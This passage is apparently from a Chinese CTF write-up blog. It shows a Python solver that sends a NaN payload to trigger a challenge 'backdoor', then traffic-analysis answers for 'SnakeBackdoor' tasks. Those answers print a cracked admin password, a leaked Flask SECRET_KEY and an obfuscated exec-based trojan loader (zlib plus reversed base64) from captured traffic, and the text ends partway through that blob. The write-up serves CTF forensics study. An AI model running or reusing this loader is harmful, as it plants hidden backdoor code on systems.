NaN (Python默认也是True)</span><br><span class="line">        return json.dumps(data, allow_nan=True)</span><br><span class="line"></span><br><span class="line">    def trigger_backdoor(self) -&gt; Tuple[Optional[str], Optional[str]]:</span><br><span class="line">        &quot;&quot;&quot;触发后门并获取加密FLAG&quot;&quot;&quot;</span><br><span class="line">        logger.info(f&quot;正在尝试触发后门: &#123;self.api_url&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        payload = self.generate_nan_payload()</span><br><span class="line">        </span><br><span class="line">        try:</span><br><span class="line">            # 这里的 payload 是字符串形式，且包含 NaN</span><br><span class="line">            response = self.session.post(</span><br><span class="line">                self.api_url,</span><br><span class="line">                data=payload,</span><br><span class="line">                timeout=self.timeout,</span><br><span class="line">                verify=False</span><br><span class="line">            )</span><br><span class="line">            response.raise_for_status()</span><br><span class="line">            </span><br><span class="line">            result = response.json()</span><br><span class="line">            </span><br><span class="line">            if result.get(&quot;backdoor_triggered&quot;):</span><br><span class="line">                logger.info(&quot;后门触发成功！&quot;)</span><br><span class="line">                return result.get(&quot;encrypted_flag&quot;), result.get(&quot;hint&quot;)</span><br><span class="line">            else:</span><br><span class="line">                logger.warning(&quot;请求成功但后门未触发 (可能是Payload被清洗)&quot;)</span><br><span class="line">                logger.debug(f&quot;响应内容: &#123;result&#125;&quot;)</span><br><span class="line">                return None, None</span><br><span class="line"></span><br><span class="line">        except requests.RequestException as e:</span><br><span class="line">            logger.error(f&quot;网络请求失败: &#123;e&#125;&quot;)</span><br><span class="line">            return None, None</span><br><span class="line">        except json.JSONDecodeError:</span><br><span class="line">            logger.error(&quot;响应不是有效的JSON格式&quot;)</span><br><span class="line">            return None, None</span><br><span class="line"></span><br><span class="line">    def decrypt_flag(self, encrypted_flag: str) -&gt; Optional[str]:</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        解密流程: Base64 -&gt; XOR -&gt; Base64</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        logger.info(&quot;开始解密 FLAG...&quot;)</span><br><span class="line">        </span><br><span class="line">        try:</span><br><span class="line">            # 1. Base64 Decode</span><br><span class="line">            step1_bytes = base64.b64decode(encrypted_flag)</span><br><span class="line">            </span><br><span class="line">            # 2. XOR Decrypt (使用 itertools.cycle 优化)</span><br><span class="line">            key_bytes = self.key.encode(&#x27;utf-8&#x27;)</span><br><span class="line">            decrypted_bytes = bytes(</span><br><span class="line">                a ^ b for a, b in zip(step1_bytes, cycle(key_bytes))</span><br><span class="line">            )</span><br><span class="line">            logger.debug(f&quot;XOR解密结果(Hex): &#123;decrypted_bytes.hex()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            # 3. Base64 Decode Again</span><br><span class="line">            # 先尝试解码，如果失败则尝试直接转义输出，防止题目坑点</span><br><span class="line">            try:</span><br><span class="line">                final_flag = base64.b64decode(decrypted_bytes).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            except Exception:</span><br><span class="line">                logger.warning(&quot;二次Base64解码失败，尝试直接输出XOR结果&quot;)</span><br><span class="line">                final_flag = decrypted_bytes.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)</span><br><span class="line"></span><br><span class="line">            return final_flag</span><br><span class="line"></span><br><span class="line">        except Exception as e:</span><br><span class="line">            logger.error(f&quot;解密过程中发生错误: &#123;e&#125;&quot;)</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        &quot;&quot;&quot;执行主流程&quot;&quot;&quot;</span><br><span class="line">        enc_flag, hint = self.trigger_backdoor()</span><br><span class="line">        </span><br><span class="line">        if hint:</span><br><span class="line">            logger.info(f&quot;题目提示: &#123;hint&#125;&quot;)</span><br><span class="line">            </span><br><span class="line">        if enc_flag:</span><br><span class="line">            flag = self.decrypt_flag(enc_flag)</span><br><span class="line">            if flag:</span><br><span class="line">                print(&quot;\n&quot; + &quot;=&quot;*60)</span><br><span class="line">                print(f&quot; [SUCCESS] FLAG: &#123;flag&#125;&quot;)</span><br><span class="line">                print(&quot;=&quot;*60 + &quot;\n&quot;)</span><br><span class="line">            else:</span><br><span class="line">                logger.error(&quot;解密得到空值&quot;)</span><br><span class="line">        else:</span><br><span class="line">            logger.error(&quot;未能获取加密FLAG，终止任务。&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = argparse.ArgumentParser(description=&quot;CTF AI Backdoor Solver&quot;)</span><br><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, </span><br><span class="line">                        default=&quot;https://eci-2zej639k5zq7v01q60o6.cloudeci1.ichunqiu.com:5000/&quot;,</span><br><span class="line">                        help=&quot;目标基础URL&quot;)</span><br><span class="line">    parser.add_argument(&quot;-k&quot;, &quot;--key&quot;, </span><br><span class="line">                        default=&quot;ctf_2025_key&quot;, </span><br><span class="line">                        help=&quot;解密密钥&quot;)</span><br><span class="line">    parser.add_argument(&quot;--test&quot;, action=&quot;store_true&quot;, help=&quot;使用硬编码数据测试解密逻辑&quot;)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    if args.test:</span><br><span class="line">        logger.info(&quot;进入本地测试模式...&quot;)</span><br><span class="line">        solver = AISolver(&quot;http://localhost&quot;, args.key)</span><br><span class="line">        # 测试数据</span><br><span class="line">        test_enc = &quot;Khk8LGtnVgIGPCsTOg4NbX8Cd0ERAT8UOR1Wb2h0WQcTPwJJOR4FK390Wl8RLDMQOR4za2hkZF45OCxE&quot;</span><br><span class="line">        res = solver.decrypt_flag(test_enc)</span><br><span class="line">        print(f&quot;测试解密结果: &#123;res&#125;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        solver = AISolver(args.url, args.key)</span><br><span class="line">        solver.run()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="SnakeBackdoor-1"><a href="#SnakeBackdoor-1" class="headerlink" title="SnakeBackdoor-1"></a>SnakeBackdoor-1</h3><p>题目内容：</p>
<blockquote>
<p>攻击者爆破成功的后台密码是什么？</p>
</blockquote>
<p><img src="https://pic1.imgdb.cn/item/6950fe84a0c391c56de5e2b0.png"></p>
<p>可以看到此次登录得到一串字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sImlzX2FkbWluIjp0cnVlfQ</span><br></pre></td></tr></table></figure>

<p>base64解码得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;_flashes&quot;:[&#123;&quot; t&quot;:[&quot;success&quot;,&quot;\u767b\u5f55\u6210\u529f&quot;]&#125;],&quot;is_admin&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>\u767b\u5f55\u6210\u529f转字符也就是登录成功的意思</p>
<p>所以密码是zxcvbnm123</p>
<p><strong>flag{zxcvbnm123}</strong></p>
<h3 id="SnakeBackdoor-2"><a href="#SnakeBackdoor-2" class="headerlink" title="SnakeBackdoor-2"></a>SnakeBackdoor-2</h3><p>题目内容：</p>
<blockquote>
<p>攻击者通过漏洞利用获取Flask应用的 <code>SECRET_KEY</code> 是什么？</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp contains &quot;SECRET_KEY&quot;</span><br></pre></td></tr></table></figure>

<p>就一个包，直接查看</p>
<p><img src="https://pic1.imgdb.cn/item/6950fed5a0c391c56de5e2b2.png"></p>
<p>得到flag{c6242af0-6891-4510-8432-e1cdf051f160}</p>
<h3 id="SnakeBackdoor-3"><a href="#SnakeBackdoor-3" class="headerlink" title="SnakeBackdoor-3"></a>SnakeBackdoor-3</h3><p>题目内容：</p>
<blockquote>
<p>攻击者植入的木马使用了加密算法来隐藏通讯内容。请分析注入Payload，给出该加密算法使用的密钥字符串(Key)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp contains &quot;data=&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>data&#x3D;a6bc</p>
<p>data&#x3D;a3ab330fb285</p>
<p>data&#x3D;e0ac7e52fc996cc2038c2d7a3899ed</p>
<p>data&#x3D;acb07e4db7c93ece4bcc37246687ae0649614caa3430ce4b</p>
<p>data&#x3D;a2ae330da7846599188b26257a88f10b50790cb47e6a97177e1053c351</p>
<p>data&#x3D;bab6694ba3c938e64b8d257b7cccee460f6347f4363ed21c300c099f129b99028eb57408024e1c32061a</p>
<p>data&#x3D;acad614ef3d82c8445d275713899f04d0d3819fc3726cf57634b189e0e95cc1f93e57656105246251f453a8396a43a6534</p>
</blockquote>
<p><img src="https://pic1.imgdb.cn/item/6950ff0fa0c391c56de5e2b4.png"></p>
<p>neta查看能看到上面信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XyA9IGxhbWJkYSBfXyA6IF9faW1wb3J0X18oJ3psaWInKS5kZWNvbXByZXNzKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZShfX1s6Oi0xXSkpOwpleGVjKChfKShiJz1jNENVM3hQKy8vdlB6ZnR2OGdyaTYzNWEwVDFyUXZNbEtHaTNpaUJ3dm02VEZFdmFoZlFFMlBFajdGT2NjVElQSThUR3FaTUMrbDlBb1lZR2VHVUFNY2Fyd1NpVHZCQ3YzN3lzK04xODVOb2NmbWpFL2ZPSGVpNE9uZTBDTDVUWndKb3BFbEp4THI5VkZYdlJsb2E1UXZyamlUUUtlRytTR2J5Wm0rNXpUay9WM25aMEc2TmVhcDdIdDZudSthY3hxc3Ivc2djNlJlRUZ4ZkVlMnAzMFlibXl5aXMzdWFWMXArQWowaUZ2cnRTc01Va2hKVzlWOVMvdE8rMC82OGdmeUtNL3lFOWhmNlM5ZUNEZFFwU3lMbktrRGlRazk3VFV1S0RQc09SM3BRbGRCL1VydmJ0YzRXQTFELzljdFpBV2NKK2pISkwxaytOcEN5dktHVmh4SDhETEw3bHZ1K3c5SW5VLzl6dDFzWC9Uc1VSVjdWMHhFWFpOU2xsWk1acjFrY0xKaFplQjhXNTl5bXhxZ3FYSkpZV0ppMm45NmhLdFNhMmRhYi9GMHhCdVJpWmJUWEZJRm1ENmtuR3ovb1B4ZVBUenVqUHE1SVd0OE5abXZ5TTVYRGcvTDhKVS9tQzRQU3ZYQStncWV1RHhMQ2x6Uk5ESEpVbXZ0a2FMYkp2YlpjU2c3VGdtN1VTZUpXa0NRb2pTaStJTklFajVjTjErRkZncEtSWG40Z1I5eXAzL1Y3OVduU2VFRklPNkM0aGNKYzRtd3BrKzA5dDF5dWU0K21BbGJobHhuWE0xUGZrK3NHQm1hVUZFMWtFak9wbmZHbnFzVithdU9xakpnY0RzaXZJZCt3SFBIYXp0NU1WczRySFJoWUJPQjZ5WGp1R1liRkhpM1hLV2hiN0FmTVZ2aHg3RjlhUGpObUlpR3FCVS9oUkZVdU1xQkNHK1ZWVVZBYmQ1cEZEVFpKM1A4d1V5bTZRQUFZUXZ4RytaSkRSU1F5cE9oWEsvTDRlRkZ0RXppdWZaUFN5cllQSldKbEFRc0RPK2RsaTQ2Y24xdTVBNUh5cWZuNHZ3N3pTcWUrVlVRL1JpL0tudjBwUW9XSDFkOWRHSndEZnFtZ3ZuS2krZ05SdWdjZlVqRzczVjZzL3RpaGx0OEIyM0t2bUp6cWlMUHptdWhyMFJGVUpLWmpHYTczaUxYVDRPdmxoTFJhU2JUVDR0cS9TQ2t0R1J5akxWbVNqMmtyMEdTc3FUamxMMmw2Yy9jWEtXalJNdDFrTUNtQ0NUVithSmU0bnB2b0I5OU9NbktuWlI0WXM1MjZtVEZUb1N3YTVqbXhCbWtSWUNtQTgyR0ZLN2FrNmJJUlRmRE1zV0dzWnZBRVh2M1BmdjVOUnpjSUZOTzN0YlFrZUIvTElWT1c1TGZBa21SNjgvNnpyTDBEWm9QanpGWkk1VkxmcTBydjlDd1VlSmtSM1BIY3VqKytkL2xPdms4L2gzSHpTZ1lUR0N3bDF1ano4aDRvVWlQeUdUNzROamJZN2ZKOHZVSHFOeitaVmZPdFZ3L3ozUk11cVNVekVBS3JqY1UyRE5RZWhCMG9ZN3hJbE9UOXU5QlQ0Uk9vREZvKzVaRjZ6Vm9IQTRlSWNrWFVPUDN5cFF2NXBFWUcrMHBXNE15SG1BUWZzT2FXeU1kZk1vcWJ3L005b0ltZEdLZEt5MVdxM2FxK3QreHV5VmROQVFNaG9XMkE3elF6b2I4WEdBM0c4VnVvS0hHT2NjMjVIQ2IvRlllU3hkd3lJZWRBeGtsTExZTUJIb2pUU3BEMWRFeG96ZGk4OUdpa2h6MzMwNW5kVG1FQ3YwWm9VT0hhY25xdFVVaEpseTdWZ3ZYK0psYXdBWTlvck5QVW1aTTdRS2JkT2tUZi9vOGFRbFM1RmUveFFrT01KR200TlhxTGVoaVJJYjkyNXNUZlZ4d29OZlA1djFNR2xhcllNaWZIbDJyRXA1QzcxaXBGanBBR2FFcDluUmowSmdFYTRsU1R1WWVWWHdxYlpRVDNPZlF2Z3QvYkhKbEFndXFTV3lzR2hxaElUSllNNlQxMG03MUppd2ZRSDVpTFhINVhiRms1M1FHY0cyY0FuRnJXeTcweEV2YWJtZjB1MGlrUXdwVTJzY1A4TG9FYS9DbEpuUFN1V3dpY01rVkxya1pHcW5CdmJrNkpUZzdIblQwdkdVY1Y2a2ZmSUw2Q0szYkUxRnkwUjZzbCtVUG9ZdmprZ1NJM1ViZkQ2N2JSeEl4ZWdCcFlUenlDRHpQeXRTRSthNzdzZHhzZ2hMcFVDNWh4ejRaZVhkeUlyYm1oQXFRdzVlRW5CdUFTRTVxVE1Ka1RwLy9oa3krZFQycGNpT0JZbi9BQ1NMeHByTFowQXkxK3pobCtYeVY5V0ZMNE5nQm9IMzRidmt4SDM2bmN0c3pvcFdHUHlkMTRSaVM0ZDBFcU5vY3F2dFd1M1l4a05nUCs4Zk0vZC9CMGlreEt4aC9HamttUVhhU1gvQis0MFU0YmZTYnNFSnBWT3NUSFR5NnUwTnI2N1N3N0J2Und1VnZmVDAvOGo3M2dZSEJPMmZHU0lKNDdBcllWbTIrTHpSVDBpSDVqN3lWUm1wdGNuQW44S2t4SjYzV0JHYjd1M2JkK0QrM3lsbm0xaDRBUjdNR042cjZMeHBqTmxBWDExd2EvWEIxek44Y1dVTm5DM1ZjemZ3VUV3UGZpNWR5bzluRUM1V085VW03OFdLUnJtM2M0OEl2VFVoZ2ROZVFFRG9zSWZoTVNtaWtFbHVRWDhMY0NSY0s5ZVVUODVidnI1SjVyekViK0R1aUdZeURGRzdQWmVmdkliM3czM3UycTh6bHhsdFdDU3RjNU80cThpV3JWSTd0YVpIeG93VHc1ekpnOVRkaEJaK2ZRclF0YzB5ZHJCbHZBbG5ZMTB2RUNuRlVCQSt5MWxXc1ZuOGNLeFVqVGRhdGk0QUYzaU0vS3VFdFE2Wm44Ykk0TFl3TWxHbkNBMVJHODhKOWw3RzRkSnpzV3I5eE9pRDhpTUkyTjFlWmQvUVV5NDNZc0lMV3g4MHlpQ3h6K0c0YlhmMnFOUkZ2Tk9hd1BTbnJwdjZRMG9GRVpvamx1UHg3Y09VMjdiQWJncHdUS28wVlV5SDZHNCt5c3ZpUXpVN1NSZDUxTEdHM1U2Y1QwWURpZFFtejJld3Ria2tLY0dWY1N5WU9lQ2xWNkNSejZiZEYvR20zVDIrUTkxNC9sa1piS3gxOVduWDc4cit4dzZicGp6V0xyMEUxZ2puS0NWeFcwWFNud2UraUc5ZGtHOG5DRmZqVWxoZFRhUzFnSjdMRnNtVWpuOHUvdlJRYlJMdy95NjZJcnIveW5LT0N6Uk9jZ3JuREZ4SDN6M0pUUVFwVGlEcGV5elJzRjRTbkdCTXY1SGJyK2NLNllUYTRNSWJmemo1VGkzRk1nSk5xZ0s1WGs5aHNpbEdzVTZ0VWJucDZTS2lKaFV2SjhicXluVU1Fem5kbCtTK09WUkNhSDJpSmw4VTNXanlCNjhScTRIQVRrL2NLN0xrSkhITWpDM1c3ZFRtT0JwZm9XTVZFTGFMK1JrcVdZdjBDcFc1cUVOTGxuT1BCckdhR05lSVphaHpibnJ1RVBJSVhHa0d6MWZFNWQ0Mk1hS1pzQ1VZdDF4WGlhaTkrY2JLR2ovZDBsSUNxN3VjN2JSaEVCeDQ2RHlCWFR6MWdmSm5UMnVyNng0QXZiNXdZMnBjWXJjRDJPUjZBaWtNdm0yYzBiaGFiSkI2bzBEaE9OSjRsQ3htS2RHQnp1d3J0czF1MEQyeXVvMzd5TExmc0dEdXllcE53OGx5VE5jMm55aENWQmZXMjNEbkJRbVdjMVFMQ29ScHBWaGpLWHdPcE9ES084UjhZSG5RTStyTGs2RU9hYkNkR0s1N2lSek1jVDN3YzQzNmtWbUhYRGNJMFpzWUdZNWFJQzVEYmRXalV0Mlp1VTBMbXVMd3pDVFM5OXpoT29POERLTnFiSzRiSU5MeUFJMlg5Mjh4aWIraG1JT3FwM29TZ0MyUGRGYzh5cXRoTjlTNTVvbXRleDJ4a0VlOENZNDhDNno0SnRxVnRxaFBRV1E4a3RlNnhsZXBpVllDcUliRTJWZzRmTi8vTC9mZi91Ly85cDRMejd1cTQ2eVdlbmtKL3g5MGovNW1FSW9yczVNY1N1Rmk5ZHlneXlSNXdKZnVxR2hPZnNWVndKZScpKQ==</span><br></pre></td></tr></table></figure>

<p>base64解码得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_ = <span class="keyword">lambda</span> __ : <span class="built_in">__import__</span>(<span class="string">&#x27;zlib&#x27;</span>).decompress(<span class="built_in">__import__</span>(<span class="string">&#x27;base64&#x27;</span>).b64decode(__[::-<span class="number">1</span>]));</span><br><span class="line"><span class="built_in">exec</span>((_)(<span class="string">b&#x27;=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&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>zlib数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import zlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">payload = b&#x27;=c4CU3xP+//vPzftv8gri635a0T1rQvMlKGi3iiBwvm6TFEvahfQE2PEj7FOccTIPI8TGqZMC+l9AoYYGeGUAMcarwSiTvBCv37ys+N185NocfmjE/fOHei4One0CL5TZwJopElJxLr9VFXvRloa5QvrjiTQKeG+SGbyZm+5zTk/V3nZ0G6Neap7Ht6nu+acxqsr/sgc6ReEFxfEe2p30Ybmyyis3uaV1p+Aj0iFvrtSsMUkhJW9V9S/tO+0/68gfyKM/yE9hf6S9eCDdQpSyLnKkDiQk97TUuKDPsOR3pQldB/Urvbtc4WA1D/9ctZAWcJ+jHJL1k+NpCyvKGVhxH8DLL7lvu+w9InU/9zt1sX/TsURV7V0xEXZNSllZMZr1kcLJhZeB8W59ymxqgqXJJYWJi2n96hKtSa2dab/F0xBuRiZbTXFIFmD6knGz/oPxePTzujPq5IWt8NZmvyM5XDg/L8JU/mC4PSvXA+gqeuDxLClzRNDHJUmvtkaLbJvbZcSg7Tgm7USeJWkCQojSi+INIEj5cN1+FFgpKRXn4gR9yp3/V79WnSeEFIO6C4hcJc4mwpk+09t1yue4+mAlbhlxnXM1Pfk+sGBmaUFE1kEjOpnfGnqsV+auOqjJgcDsivId+wHPHazt5MVs4rHRhYBOB6yXjuGYbFHi3XKWhb7AfMVvhx7F9aPjNmIiGqBU/hRFUuMqBCG+VVUVAbd5pFDTZJ3P8wUym6QAAYQvxG+ZJDRSQypOhXK/L4eFFtEziufZPSyrYPJWJlAQsDO+dli46cn1u5A5Hyqfn4vw7zSqe+VUQ/Ri/Knv0pQoWH1d9dGJwDfqmgvnKi+gNRugcfUjG73V6s/tihlt8B23KvmJzqiLPzmuhr0RFUJKZjGa73iLXT4OvlhLRaSbTT4tq/SCktGRyjLVmSj2kr0GSsqTjlL2l6c/cXKWjRMt1kMCmCCTV+aJe4npvoB99OMnKnZR4Ys526mTFToSwa5jmxBmkRYCmA82GFK7ak6bIRTfDMsWGsZvAEXv3Pfv5NRzcIFNO3tbQkeB/LIVOW5LfAkmR68/6zrL0DZoPjzFZI5VLfq0rv9CwUeJkR3PHcuj++d/lOvk8/h3HzSgYTGCwl1ujz8h4oUiPyGT74NjbY7fJ8vUHqNz+ZVfOtVw/z3RMuqSUzEAKrjcU2DNQehB0oY7xIlOT9u9BT4ROoDFo+5ZF6zVoHA4eIckXUOP3ypQv5pEYG+0pW4MyHmAQfsOaWyMdfMoqbw/M9oImdGKdKy1Wq3aq+t+xuyVdNAQMhoW2A7zQzob8XGA3G8VuoKHGOcc25HCb/FYeSxdwyIedAxklLLYMBHojTSpD1dExozdi89Gikhz3305ndTmECv0ZoUOHacnqtUUhJly7VgvX+JlawAY9orNPUmZM7QKbdOkTf/o8aQlS5Fe/xQkOMJGm4NXqLehiRIb925sTfVxwoNfP5v1MGlarYMifHl2rEp5C71ipFjpAGaEp9nRj0JgEa4lSTuYeVXwqbZQT3OfQvgt/bHJlAguqSWysGhqhITJYM6T10m71JiwfQH5iLXH5XbFk53QGcG2cAnFrWy70xEvabmf0u0ikQwpU2scP8LoEa/ClJnPSuWwicMkVLrkZGqnBvbk6JTg7HnT0vGUcV6kffIL6CK3bE1Fy0R6sl+UPoYvjkgSI3UbfD67bRxIxegBpYTzyCDzPytSE+a77sdxsghLpUC5hxz4ZeXdyIrbmhAqQw5eEnBuASE5qTMJkTp//hky+dT2pciOBYn/ACSLxprLZ0Ay1+zhl+XyV9WFL4NgBoH34bvkxH36nctszopWGPyd14RiS4d0EqNocqvtWu3YxkNgP+8fM/d/B0ikxKxh/GjkmQXaSX/B+40U4bfSbsEJpVOsTHTy6u0Nr67Sw7BvRwuVvfT0/8j73gYHBO2fGSIJ47ArYVm2+LzRT0iH5j7yVRmptcnAn8KkxJ63WBGb7u3bd+D+3ylnm1h4AR7MGN6r6LxpjNlAX11wa/XB1zN8cWUNnC3VczfwUEwPfi5dyo9nEC5WO9Um78WKRrm3c48IvTUhgdNeQEDosIfhMSmikEluQX8LcCRcK9eUT85bvr5J5rzEb+DuiGYyDFG7PZefvIb3w33u2q8zlxltWCStc5O4q8iWrVI7taZHxowTw5zJg9TdhBZ+fQrQtc0ydrBlvAlnY10vECnFUBA+y1lWsVn8cKxUjTdati4AF3iM/KuEtQ6Zn8bI4LYwMlGnCA1RG88J9l7G4dJzsWr9xOiD8iMI2N1eZd/QUy43YsILWx80yiCxz+G4bXf2qNRFvNOawPSnrpv6Q0oFEZojluPx7cOU27bAbgpwTKo0VUyH6G4+ysviQzU7SRd51LGG3U6cT0YDidQmz2ewtbkkKcGVcSyYOeClV6CRz6bdF/Gm3T2+Q914/lkZbKx19WnX78r+xw6bpjzWLr0E1gjnKCVxW0XSnwe+iG9dkG8nCFfjUlhdTaS1gJ7LFsmUjn8u/vRQbRLw/y66Irr/ynKOCzROcgrnDFxH3z3JTQQpTiDpeyzRsF4SnGBMv5Hbr+cK6YTa4MIbfzj5Ti3FMgJNqgK5Xk9hsilGsU6tUbnp6SKiJhUvJ8bqynUMEzndl+S+OVRCaH2i